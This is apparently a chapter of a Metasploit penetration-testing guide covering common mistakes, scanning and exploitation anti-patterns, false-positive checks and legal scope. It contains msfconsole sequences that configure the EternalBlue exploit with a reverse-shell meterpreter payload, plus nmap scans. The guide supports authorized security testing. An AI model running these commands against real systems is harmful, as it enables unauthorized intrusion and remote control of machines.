# Common Pitfalls & Anti-Patterns

## 10.1 Common Mistakes

| # | Mistake | Severity | Impact | Quick Fix |
|---|---------|----------|--------|-----------|
| 1 | **Running exploits without verification** | :red_circle: High | Wasted time, service disruption | Use check function if available |
| 2 | **Wrong payload for target architecture** | :red_circle: High | Failed exploit, crashes | Check `show payloads`, verify target |
| 3 | **Forgetting to set payload** | :red_circle: High | Generic shell instead of meterpreter | Always set explicit payload |
| 4 | **Not checking module options** | :red_circle: High | Missing required options | Always `show options` before run |
| 5 | **Exploiting production by mistake** | :red_circle: High | Business impact, legal issues | Double-check RHOSTS before any exploit |
| 6 | **Running exploits against wrong port** | :yellow_circle: Medium | False negatives, confusion | Verify service: `services -p 445` |
| 7 | **Ignoring module rank** | :yellow_circle: Medium | Ineffective exploits | Use `excellent` > `great` > `good` |
| 8 | **Not setting LHOST correctly** | :yellow_circle: Medium | No reverse shell | Use `ifconfig` to verify correct interface |
| 9 | **Forgetting to start handler** | :yellow_circle: Medium | Payloads have nowhere to connect | Setup multi/handler first |
| 10 | **Running without database** | :yellow_circle: Medium | Lost results, manual tracking | Always `msfdb init` first |

### Pre-Exploitation Checklist

```markdown
:clipboard: MUST verify before running ANY exploit:

- [ ] RHOSTS/RPORT are correct (verify with nmap)
- [ ] Target OS matches exploit platform
- [ ] Required options are set (no "required: yes" remaining)
- [ ] Payload is compatible with target architecture
- [ ] LHOST is accessible from target
- [ ] LPORT is not blocked by firewall
- [ ] Target is in scope (contract/legal)
- [ ] Have rollback plan (kill session, restore service)
- [ ] Service can be restarted if it crashes
- [ ] No critical data on target (unless authorized)

:warning: NEVER EXPLOIT:
- Medical devices
- Safety systems (SCADA in production)
- Systems you don't own
- Anything not explicitly in scope
```

## 10.2 Anti-Patterns

### Scanning Anti-Patterns

| Anti-Pattern | Description | Impact | Correct Approach |
|-------------|-------------|--------|------------------|
| **Aggressive scanning without cause** | `-sT -p-` on every target | IDS alerts, network congestion | Start with `-sS -T4`, escalate as needed |
| **Skipping reconnaissance** | Jump straight to exploitation | Missed opportunities, wrong approach | Always enumerate first |
| **Ignoring auxiliary modules** | Only using exploits | Miss many vulnerabilities | Run scanners/ enumeration modules |
| **Not using db_nmap** | Running nmap outside database | Lost data correlation | Always use `db_nmap` |
| **Running all scanners blindly** | No targeting | Wasted time, noise | Target based on discovered services |

### Exploitation Anti-Patterns

```markdown
:x: WRONG - What NOT to do:

# Anti-pattern 1: No payload
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
run
# Result: May crash service, no shell

# Anti-pattern 2: Wrong architecture
set PAYLOAD windows/x86/meterpreter/reverse_tcp
# Against x64 target - may fail

# Anti-pattern 3: No check for existing exploit
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
# Without checking if target is actually vulnerable

# Anti-pattern 4: Production first
set RHOSTS 192.168.1.1
# Assuming this is a test box without verification

:heavy_check_mark: CORRECT:

# 1. Always enumerate first
db_nmap -sV 10.10.10.10
services 10.10.10.10

# 2. Verify vulnerability exists
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
check  # Some modules support this

# 3. Set everything correctly
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5  # Verified IP
set LPORT 4444

# 4. Test on similar non-production system first
# 5. Have rollback plan ready
```

### Module Selection Anti-Patterns

| Anti-Pattern | Why It's Wrong | Better Approach |
|--------------|----------------|------------------|
| Using 'manual' rank exploits | Often unstable | Search for 'excellent'/'great' |
| Ignoring module documentation | May miss critical options | Read `info -d` |
| Not checking dependencies | Module fails silently | `loadpath` if needed |
| Using outdated modules | May not work | Check for updates |

## 10.3 False Positive Management

### Reducing False Positives

```bash
# Always verify with check function
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.10
check
# May return: The target is vulnerable

# Verify with secondary tool
# Use nmap script
db_nmap --script=smb-vuln-ms17-010.nse 10.10.10.10

# Cross-reference CVE details
vulns -c host,name,cvss,refs
# Manually verify CVE applies to target version
```

### Verification Process

```markdown
:clipboard: Before reporting any finding:

1. Module returned "Vulnerable" or similar
2. Verified with independent check (nmap, manual)
3. Confirmed version/range matches CVE scope
4. Identified actual impact (not theoretical)
5. Documented exact request/response

:red_circle: SUSPICIOUS:
- Module says "probably vulnerable" without check
- Generic scanner output without specifics
- No matching CVE for the vulnerability
- Target version doesn't match advisory

:white_check_mark: CONFIRMED:
- Positive check from module
- Matching CVE version range
- Manual verification successful
- Specific exploit succeeded
```

## 10.4 Legal & Scope Issues

### Critical Legal Considerations

```markdown
:warning: ABSOLUTE REQUIREMENTS:

1. Written authorization before ANY testing
   - Bug bounty: Program rules explicitly allow it
   - PT: Signed contract with scope
   - CTF: Platform terms of service

2. Scope verification
   - Every IP, domain explicitly in scope
   - No "assume testing is OK"
   - Out-of-scope list reviewed

3. Data handling
   - Minimal data exfiltration (only PoC)
   - No personal/credit card data access
   - Report-only approach to sensitive data

4. Do no harm
   - Check for safety systems (SCADA, medical)
   - Verify before destructive tests
   - Plan for rollback
```

### Scope Violation Examples

```markdown
:x: WRONG:
- Found another network, scanned it "just to see"
- Tested password spray on entire org, not just in-scope
- Accessed data beyond PoC
- Left persistence mechanisms

:white_check_mark: CORRECT:
- Reported finding: "Discovered undocumented network segment"
- Only tested authorized systems
- Minimal data access for PoC
- Cleaned up any test artifacts
```

## 10.5 Performance Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| Slow database queries | Large workspace | Archive old workspaces |
| Module load failures | Missing dependencies | `msfconsole --version-check` |
| Payload generation errors | Invalid parameters | Verify payload options |
| Meterpreter crashes | Target instability | Try stageless, or reverse_http |
| No sessions | Firewall, NAT issues | Verify LHOST, check NAT rules |

### Resource Management

```bash
# Clean old workspace
workspace -d OldWorkspace

# Archive instead of delete
workspace -a Archive2024
# Import and merge old data

# Limit scan scope
set THREADS 20  # Don't overwhelm target
set ConcurrentTargets 5

# Manage sessions
sessions -K  # Kill all sessions
sessions -i -1  # List all
```
